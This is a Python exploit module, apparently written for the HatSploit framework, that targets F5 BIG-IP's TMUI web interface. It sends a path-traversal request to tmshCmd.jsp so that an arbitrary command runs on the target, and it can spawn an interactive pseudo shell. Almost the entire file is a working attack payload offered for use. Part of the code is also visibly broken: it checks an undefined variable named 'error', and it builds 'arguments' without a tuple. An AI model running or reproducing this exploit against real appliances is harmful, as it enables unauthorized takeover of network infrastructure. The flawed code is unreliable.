#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from utils.shell.pseudo_shell import pseudo_shell

from core.lib.module import Module
from utils.http.http import http
from utils.tcp.tcp import tcp


class HatSploitModule(Module):
    tcp = tcp()
    pseudo_shell = pseudo_shell()
    http = http()

    details = {
        'Name': "F5 Big-IP TMUI Remote Code Execution",
        'Module': "exploit/multi/f5_big_ip_tmui/remote_code_execution",
        'Authors': [
            'enty8080'
        ],
        'Description': "Remote Code Execution in F5 BIG-IP Traffic Management User Interface (TMUI).",
        'Dependencies': [
            'requests'
        ],
        'Comments': [
            ''
        ],
        'Platform': "multi",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': None,
            'Type': "port",
            'Required': True
        },
        'COMMAND': {
            'Description': "Command to execute.",
            'Value': "whoami",
            'Type': None,
            'Required': True
        },
        'PSEUDO': {
            'Description': "Spawn Pseudo shell.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def generate_payload(self, command):
        self.output_process("Generating payload...")

        payload = f"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command={command}"
        return payload

    def send_payload(self, target_url, payload):
        self.output_process("Sending payload...")
        response = self.http.http_request("GET", target_url, payload)

        if response.status_code != 200:
            self.output_error("Failed to send payload!")
            return None

        return response

    def execute_command(self, target_url, command):
        payload = self.generate_payload(command)
        response = self.send_payload(target_url, payload)

        if not response:
            return False, ""

        self.output_process("Attempting to execute command...")
        error_output = response.json()["error"].strip()
        command_output = response.json()["output"].strip()

        if not error:
            return True, command_output
        return False, ""

    def run(self):
        remote_host, remote_port, command, pseudo = self.parse_options(self.options)

        target = self.http.format_host_and_port(remote_host, remote_port)
        self.output_process("Exploiting " + target + "...")

        target_url = self.http.craft_url(remote_host, remote_port)
        if not self.http.check_url_access(target_url):
            self.output_error("Exploit failed!")
            return

        payload = self.generate_payload(command)
        response = self.send_payload(target_url, payload)
        if not response:
            self.output_error("Exploit failed!")
            return

        arguments = (target_url)
        if pseudo in ['yes', 'y']:
            self.pseudo_shell.spawn_pseudo_shell(self.details['Module'], self.execute_command, arguments)
        else:
            self.pseudo_shell.execute_command(self.execute_command, command, arguments)
